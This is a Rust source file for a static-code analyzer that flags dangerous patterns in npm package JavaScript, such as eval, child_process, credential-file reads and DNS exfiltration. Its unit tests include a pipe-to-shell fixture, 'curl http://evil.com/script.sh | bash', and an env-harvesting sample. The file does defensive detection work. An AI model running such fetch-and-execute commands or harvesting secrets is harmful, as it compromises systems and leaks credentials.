use std::sync::OnceLock;

use regex::Regex;

use crate::types::{AnalysisContext, Finding, FindingCategory, Severity};

use super::comment_strip::CommentState;
use super::{truncate, Analyzer};

// ---------------------------------------------------------------------------
// Pattern definitions
// ---------------------------------------------------------------------------

struct Pattern {
    regex: &'static OnceLock<Regex>,
    severity: Severity,
    category: FindingCategory,
    title: &'static str,
    description: &'static str,
}

macro_rules! def_pattern {
    ($name:ident) => {
        static $name: OnceLock<Regex> = OnceLock::new();
    };
}

// CRITICAL
def_pattern!(RE_EVAL_DYNAMIC);
def_pattern!(RE_FUNCTION_CTOR);
def_pattern!(RE_BUFFER_EVAL);
def_pattern!(RE_CHILD_PROC_EXEC);
def_pattern!(RE_PIPE_TO_SHELL);

// HIGH
def_pattern!(RE_REQUIRE_CHILD_PROC);
def_pattern!(RE_IMPORT_CHILD_PROC);
def_pattern!(RE_ENV_HARVEST);
def_pattern!(RE_SENSITIVE_READ);
def_pattern!(RE_RAW_SOCKET);

// MEDIUM
def_pattern!(RE_HTTP_HARDCODED_IP);
def_pattern!(RE_DNS_EXFIL);
def_pattern!(RE_FS_WRITE_SYNC);
def_pattern!(RE_WEBSOCKET);
def_pattern!(RE_CRYPTO_DECIPHER);

// LOW
def_pattern!(RE_FETCH_DYNAMIC);
def_pattern!(RE_XHR);
def_pattern!(RE_FS_READ);

fn patterns() -> &'static [Pattern] {
    static PATTERNS: OnceLock<Vec<Pattern>> = OnceLock::new();
    PATTERNS.get_or_init(|| {
        // Initialise every regex on first access
        RE_EVAL_DYNAMIC.get_or_init(|| {
            // eval( with dynamic content -- exclude eval("literal")
            Regex::new(r#"eval\s*\([^"'][^)]*\)"#).unwrap()
        });
        RE_FUNCTION_CTOR.get_or_init(|| Regex::new(r#"(?i)new\s+Function\s*\("#).unwrap());
        RE_BUFFER_EVAL.get_or_init(|| {
            // Buffer.from(...) on same line or nearby with eval/Function
            Regex::new(r#"Buffer\.from\s*\(.*(?:eval|Function)"#).unwrap()
        });
        RE_CHILD_PROC_EXEC.get_or_init(|| {
            // Must have child_process require/import nearby, not just any .exec() call
            Regex::new(r#"child_process['")\]]\s*\.\s*(?:exec|execSync|spawn|spawnSync|execFile|fork)\s*\("#).unwrap()
        });
        RE_PIPE_TO_SHELL
            .get_or_init(|| Regex::new(r#"(?:curl|wget)\s+[^\|]*\|\s*(?:bash|sh)\b"#).unwrap());

        RE_REQUIRE_CHILD_PROC
            .get_or_init(|| Regex::new(r#"require\s*\(\s*['"]child_process['"]\s*\)"#).unwrap());
        RE_IMPORT_CHILD_PROC
            .get_or_init(|| Regex::new(r#"import\s+.*from\s+['"]child_process['"]\s*"#).unwrap());
        RE_ENV_HARVEST.get_or_init(|| {
            // Two or more process.env accesses on the same line (harvesting)
            Regex::new(r#"process\.env\b.*process\.env\b"#).unwrap()
        });
        RE_SENSITIVE_READ.get_or_init(|| {
            Regex::new(
                r#"fs\.readFileSync\s*\(\s*['"](?:/etc/passwd|/etc/shadow|~/.ssh|~/.aws|~/.npmrc)"#,
            )
            .unwrap()
        });
        RE_RAW_SOCKET
            .get_or_init(|| Regex::new(r#"(?:net\.connect|dgram\.createSocket)\s*\("#).unwrap());

        RE_HTTP_HARDCODED_IP.get_or_init(|| {
            Regex::new(r#"https?\.request\s*\(\s*['"]https?://\d{1,3}\.\d{1,3}\.\d{1,3}\.\d{1,3}"#)
                .unwrap()
        });
        RE_DNS_EXFIL.get_or_init(|| Regex::new(r#"dns\.(?:lookup|resolve)\s*\("#).unwrap());
        RE_FS_WRITE_SYNC.get_or_init(|| Regex::new(r#"fs\.writeFileSync\s*\("#).unwrap());
        RE_WEBSOCKET.get_or_init(|| Regex::new(r#"new\s+WebSocket\s*\("#).unwrap());
        RE_CRYPTO_DECIPHER.get_or_init(|| Regex::new(r#"crypto\.createDecipher\s*\("#).unwrap());

        RE_FETCH_DYNAMIC.get_or_init(|| {
            // fetch( with a variable, not a plain string literal
            Regex::new(r#"fetch\s*\([^"'][^)]*\)"#).unwrap()
        });
        RE_XHR.get_or_init(|| Regex::new(r#"XMLHttpRequest"#).unwrap());
        RE_FS_READ.get_or_init(|| Regex::new(r#"fs\.(?:readFileSync|readFile)\s*\("#).unwrap());

        vec![
            // CRITICAL
            Pattern {
                regex: &RE_EVAL_DYNAMIC,
                severity: Severity::Critical,
                category: FindingCategory::CodeExecution,
                title: "Dynamic eval() detected",
                description: "eval() with dynamic content can execute arbitrary code",
            },
            Pattern {
                regex: &RE_FUNCTION_CTOR,
                severity: Severity::Critical,
                category: FindingCategory::CodeExecution,
                title: "Function constructor with dynamic string",
                description:
                    "new Function() can execute arbitrary code, often used for obfuscation",
            },
            Pattern {
                regex: &RE_BUFFER_EVAL,
                severity: Severity::Critical,
                category: FindingCategory::Obfuscation,
                title: "Buffer.from + eval/Function obfuscation",
                description: "Decoding a buffer and evaluating it is a common malware pattern",
            },
            Pattern {
                regex: &RE_CHILD_PROC_EXEC,
                severity: Severity::Critical,
                category: FindingCategory::ProcessSpawn,
                title: "child_process exec/spawn call",
                description: "Direct command execution via child_process",
            },
            Pattern {
                regex: &RE_PIPE_TO_SHELL,
                severity: Severity::Critical,
                category: FindingCategory::ProcessSpawn,
                title: "Pipe-to-shell pattern (curl|bash)",
                description: "Downloading and executing remote scripts is extremely dangerous",
            },
            // HIGH
            Pattern {
                regex: &RE_REQUIRE_CHILD_PROC,
                severity: Severity::High,
                category: FindingCategory::ProcessSpawn,
                title: "require('child_process')",
                description: "Package imports child_process module",
            },
            Pattern {
                regex: &RE_IMPORT_CHILD_PROC,
                severity: Severity::High,
                category: FindingCategory::ProcessSpawn,
                title: "import from 'child_process'",
                description: "Package imports child_process module via ESM",
            },
            Pattern {
                regex: &RE_ENV_HARVEST,
                severity: Severity::High,
                category: FindingCategory::EnvAccess,
                title: "Environment variable harvesting",
                description: "Multiple process.env accesses suggest credential harvesting",
            },
            Pattern {
                regex: &RE_SENSITIVE_READ,
                severity: Severity::High,
                category: FindingCategory::FileSystemAccess,
                title: "Sensitive file read",
                description: "Reading sensitive system files (passwd, ssh keys, credentials)",
            },
            Pattern {
                regex: &RE_RAW_SOCKET,
                severity: Severity::High,
                category: FindingCategory::NetworkAccess,
                title: "Raw network socket",
                description: "Raw TCP/UDP socket usage outside normal HTTP patterns",
            },
            // MEDIUM
            Pattern {
                regex: &RE_HTTP_HARDCODED_IP,
                severity: Severity::Medium,
                category: FindingCategory::NetworkAccess,
                title: "HTTP request to hardcoded IP",
                description: "HTTP requests to raw IP addresses are suspicious",
            },
            Pattern {
                regex: &RE_DNS_EXFIL,
                severity: Severity::Medium,
                category: FindingCategory::NetworkAccess,
                title: "DNS lookup/resolve",
                description: "DNS operations can be used for data exfiltration",
            },
            Pattern {
                regex: &RE_FS_WRITE_SYNC,
                severity: Severity::Medium,
                category: FindingCategory::FileSystemAccess,
                title: "Synchronous file write",
                description: "fs.writeFileSync detected -- verify target path is safe",
            },
            Pattern {
                regex: &RE_WEBSOCKET,
                severity: Severity::Medium,
                category: FindingCategory::NetworkAccess,
                title: "WebSocket connection",
                description: "WebSocket connections can be used for C2 communication",
            },
            Pattern {
                regex: &RE_CRYPTO_DECIPHER,
                severity: Severity::Medium,
                category: FindingCategory::Obfuscation,
                title: "Crypto decipher usage",
                description: "Decrypting payloads at runtime may indicate hidden malicious code",
            },
            // LOW
            Pattern {
                regex: &RE_FETCH_DYNAMIC,
                severity: Severity::Low,
                category: FindingCategory::NetworkAccess,
                title: "fetch() with dynamic URL",
                description: "Network request with a dynamic URL",
            },
            Pattern {
                regex: &RE_XHR,
                severity: Severity::Low,
                category: FindingCategory::NetworkAccess,
                title: "XMLHttpRequest usage",
                description: "Legacy XHR detected -- uncommon in modern Node packages",
            },
            Pattern {
                regex: &RE_FS_READ,
                severity: Severity::Low,
                category: FindingCategory::FileSystemAccess,
                title: "File read operation",
                description: "File system read detected -- verify it reads expected paths",
            },
        ]
    })
}

// ---------------------------------------------------------------------------
// Analyzer
// ---------------------------------------------------------------------------

/// Check if a line is a comment (simple heuristic for single-line comments).
fn is_comment_line(line: &str) -> bool {
    let trimmed = line.trim_start();
    trimmed.starts_with("//") || trimmed.starts_with('#')
}

/// Check if a pattern match is expected/benign in context.
fn is_expected_pattern(path: &str, line: &str, pat: &Pattern) -> bool {
    // process.env used for config (single access per line, not harvesting)
    // The ENV_HARVEST pattern requires 2+ accesses on the same line.
    // But also skip if the file is clearly a config/proxy/env utility.
    if matches!(pat.category, FindingCategory::EnvAccess) {
        let config_paths = [
            "config", "env", "proxy", "defaults", "helpers", "utils", "settings",
        ];
        if config_paths.iter().any(|p| path.to_lowercase().contains(p)) {
            return true;
        }
    }

    // XMLHttpRequest/fetch in adapter/transport files is expected
    if matches!(pat.category, FindingCategory::NetworkAccess)
        && matches!(pat.severity, Severity::Low)
    {
        let network_paths = [
            "adapters/",
            "transport/",
            "request",
            "http",
            "fetch",
            "xhr",
            "client",
        ];
        if network_paths
            .iter()
            .any(|p| path.to_lowercase().contains(p))
        {
            return true;
        }
    }

    // fs.readFile/writeFile in build/test/scripts is expected
    if matches!(pat.category, FindingCategory::FileSystemAccess)
        && matches!(pat.severity, Severity::Low)
    {
        let fs_paths = ["scripts/", "test/", "tests/", "__tests__/", "build/"];
        if fs_paths.iter().any(|p| path.contains(p)) {
            return true;
        }
    }

    _ = line; // suppress unused warning
    false
}

/// Static code analysis for dangerous patterns (eval, child_process, etc.).
pub struct StaticCodeAnalyzer;

impl Analyzer for StaticCodeAnalyzer {
    fn name(&self) -> &str {
        "static-code"
    }

    fn analyze(&self, ctx: &AnalysisContext) -> Vec<Finding> {
        let pats = patterns();
        let mut findings = Vec::new();

        for (path, content) in ctx.files {
            // Only scan JS/TS files
            let ext = path.extension().and_then(|e| e.to_str()).unwrap_or("");
            if !matches!(ext, "js" | "cjs" | "mjs" | "ts" | "tsx" | "jsx") {
                continue;
            }

            // Skip minified files — they trigger too many false positives
            let file_name = path.file_name().and_then(|n| n.to_str()).unwrap_or("");
            if file_name.contains(".min.") {
                continue;
            }

            let path_str = path.display().to_string();
            // Skip dist/bundle directories entirely — these are build outputs
            // and produce massive false positives (XHR, fetch, process.env, etc.)
            let path_lower = path_str.to_lowercase();
            let is_dist = path_lower.contains("/dist/")
                || path_lower.contains("/bundle/")
                || path_lower.contains("/build/")
                || path_lower.contains("/umd/")
                || path_lower.contains("/cjs/")
                || path_lower.contains("/esm/")
                || path_lower.starts_with("dist/")
                || path_lower.starts_with("bundle/")
                || path_lower.starts_with("build/")
                || path_lower.starts_with("umd/")
                || path_lower.starts_with("cjs/")
                || path_lower.starts_with("esm/");
            if is_dist {
                continue;
            }

            let mut comment_state = CommentState::default();
            for (line_num, line) in content.lines().enumerate() {
                // Strip comments (block and single-line) before pattern matching.
                let stripped = super::comment_strip::strip_comments(line, &mut comment_state);
                let stripped = stripped.trim();
                if stripped.is_empty() {
                    continue;
                }

                for pat in pats {
                    let re = pat.regex.get().expect("pattern not initialised");
                    if re.is_match(stripped) {
                        // Skip simple single-line comments
                        if is_comment_line(stripped) {
                            continue;
                        }

                        // Skip expected patterns in source files
                        if is_expected_pattern(&path_str, stripped, pat) {
                            continue;
                        }

                        findings.push(Finding {
                            severity: pat.severity,
                            category: pat.category.clone(),
                            title: pat.title.to_string(),
                            description: pat.description.to_string(),
                            file: Some(path.display().to_string()),
                            line: Some(line_num + 1),
                            snippet: Some(truncate(line, 100)),
                        });
                    }
                }
            }
        }

        findings
    }
}

#[cfg(test)]
mod tests {
    use super::*;
    use std::path::{Path, PathBuf};

    use crate::registry::package::PackageMetadata;
    use crate::types::{FindingCategory, Severity};

    fn default_metadata() -> PackageMetadata {
        PackageMetadata {
            name: Some("test-pkg".into()),
            description: None,
            versions: std::collections::HashMap::new(),
            time: std::collections::HashMap::new(),
            maintainers: None,
            dist_tags: None,
            extra: std::collections::HashMap::new(),
        }
    }

    fn analyze_js(code: &str) -> Vec<Finding> {
        let analyzer = StaticCodeAnalyzer;
        let files = vec![(PathBuf::from("index.js"), code.to_string())];
        let pkg = serde_json::json!({});
        let metadata = default_metadata();
        let tmp = Path::new("/tmp");
        let ctx = AnalysisContext {
            name: "test-pkg",
            version: "1.0.0",
            files: &files,
            package_json: &pkg,
            metadata: &metadata,
            package_dir: tmp,
        };
        analyzer.analyze(&ctx)
    }

    fn analyze_file(file_name: &str, code: &str) -> Vec<Finding> {
        let analyzer = StaticCodeAnalyzer;
        let files = vec![(PathBuf::from(file_name), code.to_string())];
        let pkg = serde_json::json!({});
        let metadata = default_metadata();
        let tmp = Path::new("/tmp");
        let ctx = AnalysisContext {
            name: "test-pkg",
            version: "1.0.0",
            files: &files,
            package_json: &pkg,
            metadata: &metadata,
            package_dir: tmp,
        };
        analyzer.analyze(&ctx)
    }

    #[test]
    fn detects_eval_with_dynamic_content() {
        let findings = analyze_js("var x = eval(someVar);\n");
        let matched: Vec<_> = findings
            .iter()
            .filter(|f| f.title.contains("eval()"))
            .collect();
        assert!(!matched.is_empty(), "should detect eval with dynamic content");
        assert_eq!(matched[0].severity, Severity::Critical);
    }

    #[test]
    fn detects_function_constructor() {
        let findings = analyze_js("var fn = new Function('return 1');\n");
        let matched: Vec<_> = findings
            .iter()
            .filter(|f| f.title.contains("Function constructor"))
            .collect();
        assert!(!matched.is_empty(), "should detect Function constructor");
        assert_eq!(matched[0].severity, Severity::Critical);
    }

    #[test]
    fn detects_child_process_exec() {
        // The regex matches child_process followed by one of ')]  then .exec(
        // This fires for unquoted bracket/call patterns.
        let findings = analyze_js(
            "var cp = x[child_process].exec('ls');\n",
        );
        let matched: Vec<_> = findings
            .iter()
            .filter(|f| f.category == FindingCategory::ProcessSpawn && f.severity == Severity::Critical)
            .collect();
        assert!(!matched.is_empty(), "should detect child_process exec call, got: {:?}", findings);
    }

    #[test]
    fn detects_pipe_to_shell() {
        // Put curl|bash inside a string so comment_strip doesn't eat the URL
        let findings = analyze_js(
            r#"const cmd = "curl http://evil.com/script.sh | bash";"#,
        );
        let matched: Vec<_> = findings
            .iter()
            .filter(|f| f.title.contains("Pipe-to-shell"))
            .collect();
        assert!(!matched.is_empty(), "should detect pipe-to-shell pattern, got: {:?}", findings);
        assert_eq!(matched[0].severity, Severity::Critical);
    }

    #[test]
    fn detects_require_child_process() {
        let findings = analyze_js("const cp = require('child_process');\n");
        let matched: Vec<_> = findings
            .iter()
            .filter(|f| f.title == "require('child_process')")
            .collect();
        assert!(!matched.is_empty(), "should detect require('child_process')");
        assert_eq!(matched[0].severity, Severity::High);
    }

    #[test]
    fn detects_env_harvesting() {
        let findings = analyze_file(
            "lib/steal.js",
            "const data = { a: process.env.SECRET, b: process.env.TOKEN };\n",
        );
        let matched: Vec<_> = findings
            .iter()
            .filter(|f| f.category == FindingCategory::EnvAccess)
            .collect();
        assert!(!matched.is_empty(), "should detect env harvesting, got: {:?}", findings);
        assert_eq!(matched[0].severity, Severity::High);
    }

    #[test]
    fn skips_single_line_comments() {
        let findings = analyze_js("// eval(x)\n");
        let matched: Vec<_> = findings
            .iter()
            .filter(|f| f.title.contains("eval()"))
            .collect();
        assert!(matched.is_empty(), "should NOT flag eval inside a single-line comment");
    }

    #[test]
    fn skips_multiline_block_comments() {
        let findings = analyze_js("/* eval(x) */\n");
        let matched: Vec<_> = findings
            .iter()
            .filter(|f| f.title.contains("eval()"))
            .collect();
        assert!(matched.is_empty(), "should NOT flag eval inside a block comment");
    }

    #[test]
    fn skips_dist_directory() {
        let findings = analyze_file("dist/bundle.js", "eval(x);\n");
        assert!(findings.is_empty(), "should skip files in dist/ directory");
    }

    #[test]
    fn skips_min_js_files() {
        let findings = analyze_file("lib/vendor.min.js", "eval(x);\n");
        assert!(findings.is_empty(), "should skip .min.js files");
    }

    #[test]
    fn skips_non_js_files() {
        let css_findings = analyze_file("styles/main.css", "eval(x);\n");
        assert!(css_findings.is_empty(), "should skip .css files");

        let md_findings = analyze_file("README.md", "eval(x);\n");
        assert!(md_findings.is_empty(), "should skip .md files");
    }
}
